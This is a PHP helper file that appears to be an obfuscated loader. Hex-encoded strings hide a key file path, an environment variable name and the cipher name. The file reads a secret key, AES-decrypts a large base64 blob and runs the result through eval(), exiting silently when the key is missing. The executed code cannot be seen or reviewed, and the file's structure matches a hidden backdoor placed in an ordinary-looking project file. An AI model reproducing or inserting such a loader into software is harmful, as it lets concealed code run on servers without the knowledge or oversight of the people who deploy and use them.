<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('PqhDdqKTA284PAFqxuF2Rg==');

$c=base64_decode(

'T9gqwhWIgYQt1+L3mGL8Ya+0UqpG/r5VVSf/aGes/0IsyIQmd5D3MQYRogvvRtFoYW0vyHKa2qM8' .
'ydjEmj9K4frIpVZVRxwToFj4IywvJMzR+bnPpdJLk/abIHvniYxb2caVOudqGC8S+aMAHJ/E6rR4' .
'UnGDDecqnOaWqd/vcVTHAFtjyA9IeDoHqxPxaejAacsC8/hmSPjPboknnSijUXhCzJv8+KXqhJT6' .
'59sgxic175hGhB8IBMmQ5KNqBEdFNLr05Q7BcmvGfLCLh5fQEDtZfB+nDDOTXovaknajY4dHx6/L' .
'v7kXTgMd7cXDmNYB848V1EZYXqdGJbXf62aOrsbkJeIXtxs4lOqiydYGUL0M5bmlvTQMxsP9LyWz' .
'U61+GKfibo5V7Z8daAl/d+5fJGLplilw7AugI75bVy4QfVdvOf5sSLzUNirnhyTYkaEFTxnw4g0A' .
'qcPAy/1DQwYBEgSGcOLMkwMBdpT+GqAOObcXXo3Cv08qDFyWyRCrO8SGPt98HhZXhEKdnoyb0WXv' .
'YgCC0Ug/SCOc0P6PsoFuMcJkkSsJqlbgJz+uoSf7hx7Y2xwzsqFm/avj7P9c3cMtUJSVZjzRjnNi' .
'VGTjeN59FrMHd2kDyGxKcUYgO/59vsmKNSyvchR5i11hi/jpLtgykEqS7vqyVRhfcKl6RcfA6JSy' .
'mx3urvWBhD2SErJTmstlxD+eTADqaxhmE0MLr8/fg6htOdx4gDGWTjpYKIVGtI0tYqPUv6cwnHa+' .
'9As+ZURr0Yxx0tThrAXWbMNCjIAzuuoS3M/pj/KWLmp52GDpKvUj+PPfq+1D2+2Pn5NfChqid5uf' .
'd5G7b5eesQg/ijjWZ8/LWI3xtsN6xC5PwUi8I25A/S/ptHI3PrsKCgko9d1Chzk3PviiTVXhKlhf' .
'Sqhbr6jqKOaPPGK3nU38MbwBTl2UbeX+eHjMsZAcjyE7yD6w4G+AzvQMKoiyTY6Kz5au4IXp0RFp' .
'o2Y+y8y+3EaUPeIWiUPUC+rvxf0McjJSecGeSGGWARzvuoreQrxVqWn12kyyforRhuQNsBVt1Djm' .
'n8iZKHwIzZOMD3n/oTvzmVuslYCWzjEASa4vyP6jzaZ/91ymLZcIO6qYGr77OLcmn8SvI+/Y/FOp' .
'EAzYQOAcogEPSkefYNWHxZZ1yS0PB5gI9PjG/xHoi37+V5rKiHiJg5MciDUmi+9mgxQlNKZq53Uu' .
'M6WKu/EnLuoe/3UypC5F6kMCY9MISoo2Gs2X20Hs6spJDp70IRrkq0WZ1o4b647cOfnhdY1GxfxG' .
'kjoKWjWRbrIpQ19FIF+YuzNeJMgU2Vt1fq4SBwsMcUAJ1JdkhzknSKUS9s9U86OfBGHc5iosaU5G' .
'kIDG1Q7qGHOOfEClOZk6YnQG3KujBA20EaWD5EfLZ/r1J0HRBc3hbqnbuXzlHscxc3MmCBfBbHue' .
'iSB8PmB7MDYFfRJ+96V6xAEybg6ABMLUY9MYVOQfqeyUarflD8VZ2Y/V34QpzFrrQ5DhQqmtA9/P' .
'lf1kl++/VF3Utw88giIia3KE329ighLn1oRcy4PSAcgXgwaOHXDFts92owlB/FHC1lyslbkiLdVz' .
'J6Z8SIWXuI9NH8ifbyJ4gQemHAmTiuNqkmL7DatykTWSeKXtcOquVzb9fAmM59n2xmWvstGoNP8N' .
'j38YCgVHHojIzmacaxaxJWLFc6JVDX9zzysCvR85eLWuZ2Ql6efmcMJRemhCKsG0jvqcNC18kkbQ' .
'uLlIS8Z7hX2yVIxplUnecQbzr2OdKOQu/Sj8wMCImaZaxzOPTrNIpi+PrS2LX24HxSdgW0+Nj6bD' .
'7XRrv69dghaxAeZv++cHsXXQS4f3i+V7Wkw7sEmEQoQecXvJYV7mzleMy3g+LwHq0n8CRNLVnqev' .
'8k8rxUaYBdCU73NFC58OXOGrAUzzA5BjH8/q8xkmy6j0dCm9346hvCMwwfBj2caiCPsQsPsJ121j' .
'6vNg+cDoAO/ABOLinvpov6njPP/zW6wA1DinoEjIW25Mtu02QqLW+CgWoPrrAy1w06/RtzzwvlK5' .
'jkhA0hNs+Bv9CkL03Q0HrSgb0Da3lKVSs71cnoycIu+SuVADT2RD8JhIzD56ZyiylQIODgi34Pzh' .
'KiUiD3bOs/H8U/G9Ru8Sd6V7WgQkh1r15jHP1pDnCaeKJcLBklTRqieruiy3E1Qm9BLIkihLXPy1' .
'OOu2dHf2cE9Gwxg4KP61aWCtMIRbdsYhM7noLPWltvUg2xeXiqILkgeerxB3Bs9EdaArwHyDLenl' .
'x/iwKvOhCwluKu2uOH+eAxRE0uk2SnPpiWpyIiXyR00KYhPsZzZt2hSyxceECWjMR+5x7GMN/cSP' .
'Rpa7MKowvbgn3JSDcGpNUskPv1RGv142PQnwXRqY3BLbSeoH3fLLa4mENu/Hn3U/R7H/G0ZX6yM3' .
'2AMtWvNldNT/f7ifWwti+717dQfkH2uyv42OtQety2MI7YxxcZ5k3zTASuMHUbybiDC3Ty3gSfLL' .
'kvip0ip+hBx5YsGJr2cOdjlrBLTGZQ504Us6PbCqwwKvDIUZxF36SReuk5rcM4RivrECzgJYiOfb' .
'cqKip/HKUnGRfJETTYho/aRisHt2YCNg53Ys15EI6fAfjvQ+SAn5klpJPk53DmTSMIHZ/chfOq/j' .
'odNmr+d50AWMfNmbDybY4+aYqbTekqc56AyEPRPWNRGWhSy0z4/yWiFwM8fEGrQRkXzuEjJVfkGF' .
'T/wgMpPTH9vFCsPivFImfQP5YtstQ//o+vtRxi4o8vKZhsy4ya+hMkRp2wp+MOkZhKZJ0XBGXb2H' .
'kLTlK2g3Eh/B8JCXz8ieLzrh7xRWK2OtGtZYfKJRxejDVzkYpiSsQ2wupDS9N6sgzDFQ8kGPNN7P' .
'gCUewMRJBFgAUtlo0ddPy25ifj4lRvk++a4HPhBsEIx5yCg22OizQVWWMJac8tLVPzb4ZdvuLh2N' .
'H+/18hwASAZKyrSNN5pWxIw='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

